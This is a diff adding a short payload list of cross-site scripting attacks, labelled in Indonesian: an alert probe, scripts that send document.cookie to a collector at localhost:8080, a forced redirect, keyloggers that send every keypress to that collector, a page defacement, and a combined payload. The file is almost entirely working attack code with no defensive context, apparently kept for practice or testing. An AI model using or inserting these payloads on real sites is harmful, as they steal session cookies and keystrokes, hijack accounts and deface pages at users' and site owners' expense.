@@ -1,0 +1,35 @@
+alert
+<script>alert('XSS')</script>
+
+mengambil cookie
+<script>fetch('http://localhost:8080?cookie='+document.cookie)</script>
+<script>fetch('http://localhost:8080/log?cookie=' + document.cookie)</script>
+
+redirect halaman
+<script>window.location='https://shopee.co.id/'</script>
+
+Mencatat Ketikan
+<script>
+document.onkeypress = function(e) {
+    fetch('http://localhost:8080/log?key=' + e.key)
+}
+</script>
+
+<script>
+document.onkeypress = function(e) {
+    fetch('http://localhost:8080/log?key=' + encodeURIComponent(e.key))
+}
+</script>
+
+mengubah tampilan
+<script>document.body.innerHTML='<h1>Site Defaced!</h1>'</script>
+
+
+kombinasi
+<script>alert('Serangan XSS')</script>
+<script>fetch('http://localhost:8080/log?cookie=' + document.cookie)</script>
+<script>
+document.onkeypress = function(e) {
+    fetch('http://localhost:8080/log?key=' + encodeURIComponent(e.key))
+}
+</script>
